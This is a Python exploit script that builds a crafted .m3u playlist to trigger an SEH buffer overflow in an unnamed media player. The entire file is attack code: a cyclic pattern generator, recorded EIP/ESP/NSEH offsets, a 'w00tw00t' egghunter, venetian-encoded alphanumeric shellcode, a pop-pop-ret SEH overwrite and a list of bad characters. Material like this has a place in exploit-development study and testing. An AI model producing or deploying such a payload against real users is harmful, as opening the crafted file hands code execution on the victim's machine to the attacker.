#!/usr/bin/python
import sys
from subprocess import call
from struct import pack
import codecs

def c(x):
  return pack('<L', x)

def pc(size):
	char1 = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
	char2 = "abcdefghijklmnopqrstuvwxyz"
	char3 = "0123456789"

	charcnt = 0
	pattern = ""
	max = int(size)
	while charcnt < max:
		for ch1 in char1:
			for ch2 in char2:
				for ch3 in char3:
					if charcnt < max:
						pattern = pattern + ch1
						charcnt = charcnt + 1
					if charcnt < max:
						pattern = pattern + ch2
						charcnt = charcnt + 1
					if charcnt < max:
						pattern = pattern + ch3
						charcnt = charcnt + 1
	return pattern

def junk(size):
	return "\x44"*size

buffer = "c:\\"
exploit = ""
buffsize = 27000
#OFFSETS
# EIP - 5829 * 26109 & 46389
# ESP - 5837 - LENGTH 883
# NSEH 4078 - 494 bytes after. too small for shellcode, using egghunter

#egghunter basereg EAX w00tw00t tag
egghunter = ("PPYAIAIAIAIAQATAXAZAPA3QADAZ"
"ABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAX"
"A58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABA"
"BAB30APB944JBQVE1HJKOLOPB0RBJLBQHHMNNOLM5PZ4"
"4JO7H2WP0P0T4TKZZFOSEZJ6OT5K7KO9WA")


#449
egg = "w00tw00t"
shellcode = ("\x50\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49"
"\x49\x49\x49\x37\x51\x5a\x6a\x41\x58\x50\x30\x41\x30\x41\x6b"
"\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42\x58"
"\x50\x38\x41\x42\x75\x4a\x49\x79\x6c\x68\x68\x6c\x42\x63\x30"
"\x43\x30\x37\x70\x35\x30\x4c\x49\x38\x65\x64\x71\x6f\x30\x42"
"\x44\x4c\x4b\x46\x30\x76\x50\x4e\x6b\x46\x32\x64\x4c\x6c\x4b"
"\x33\x62\x66\x74\x6c\x4b\x42\x52\x47\x58\x56\x6f\x38\x37\x50"
"\x4a\x54\x66\x75\x61\x69\x6f\x6e\x4c\x65\x6c\x50\x61\x51\x6c"
"\x55\x52\x66\x4c\x57\x50\x79\x51\x78\x4f\x56\x6d\x43\x31\x48"
"\x47\x49\x72\x59\x62\x33\x62\x36\x37\x4c\x4b\x52\x72\x62\x30"
"\x6e\x6b\x63\x7a\x65\x6c\x6c\x4b\x42\x6c\x34\x51\x31\x68\x78"
"\x63\x62\x68\x35\x51\x58\x51\x56\x31\x6c\x4b\x33\x69\x75\x70"
"\x73\x31\x6e\x33\x6e\x6b\x32\x69\x37\x68\x79\x73\x47\x4a\x63"
"\x79\x4e\x6b\x56\x54\x6c\x4b\x36\x61\x78\x56\x34\x71\x6b\x4f"
"\x6e\x4c\x6b\x71\x38\x4f\x36\x6d\x53\x31\x6a\x67\x67\x48\x49"
"\x70\x64\x35\x38\x76\x57\x73\x43\x4d\x6b\x48\x35\x6b\x51\x6d"
"\x75\x74\x42\x55\x6a\x44\x51\x48\x6e\x6b\x51\x48\x46\x44\x56"
"\x61\x69\x43\x55\x36\x4c\x4b\x56\x6c\x32\x6b\x6e\x6b\x52\x78"
"\x55\x4c\x77\x71\x5a\x73\x6e\x6b\x44\x44\x6e\x6b\x36\x61\x5a"
"\x70\x6f\x79\x77\x34\x46\x44\x55\x74\x53\x6b\x33\x6b\x31\x71"
"\x33\x69\x32\x7a\x36\x31\x69\x6f\x59\x70\x43\x6f\x43\x6f\x62"
"\x7a\x6c\x4b\x36\x72\x58\x6b\x6c\x4d\x63\x6d\x30\x6a\x43\x31"
"\x6c\x4d\x4b\x35\x6c\x72\x55\x50\x47\x70\x57\x70\x30\x50\x62"
"\x48\x46\x51\x6c\x4b\x32\x4f\x4b\x37\x59\x6f\x48\x55\x6d\x6b"
"\x4f\x5a\x79\x55\x59\x72\x63\x6d\x62\x48\x69\x36\x4a\x35\x4d"
"\x6d\x6d\x4d\x6b\x4f\x68\x55\x37\x4c\x57\x76\x33\x4c\x34\x4a"
"\x6f\x70\x49\x6b\x69\x70\x63\x45\x76\x65\x4d\x6b\x62\x67\x44"
"\x53\x30\x72\x72\x4f\x62\x4a\x65\x50\x53\x63\x39\x6f\x6b\x65"
"\x45\x33\x70\x61\x72\x4c\x70\x63\x46\x4e\x45\x35\x64\x38\x63"
"\x55\x45\x50\x41\x41")

# venetian = "m\xbb\x56\x41m\xb8\x55\x41\xe3m\xb9\x4b\x41m\xb8\x6d\x41\xe1m\xba\x79\x41m\xb8\x63\x41\xe2mUmX\xfc\xcc\xd4\xf8\xd8m" #assumes nopslep
venetian = "\xbb\x56\x41m\xb8\x55\x41\xe3m\xb9\x4b\x41m\xb8\x6d\x41\xe1m\xba\x79\x41m\xb8\x63\x41\xe2mUmX\xfc\xcc\xd4\xf8\xd8m"
# print len(shellcode)
#ESP+284
#Bad Chars: \x00 \x0a \x1a \x09 \x0d

buffsize = 6000
sehoffset = 4078

print len(shellcode+venetian)
exploit += egg + shellcode
exploit += junk(sehoffset-len(exploit))
nseh = "\x41\x6D" #NSEH walkover #nop
seh = "\xb4\x57" #0x005700b4 #pop pop ret
exploit += nseh + seh + venetian + shellcode
print len(venetian)
print len(junk(buffsize-len(exploit)))
exploit += junk(buffsize-len(exploit))


print "Exploit size %s" % len(exploit)

exploit += ".mp3"
print "[+] Creating malicious file"
print "[+] exploit.m3u"

buffer +=exploit
file = open("/Users/omaidfaizyar/Desktop/VM/exploit.m3u","w")
file.write(buffer)
file.close()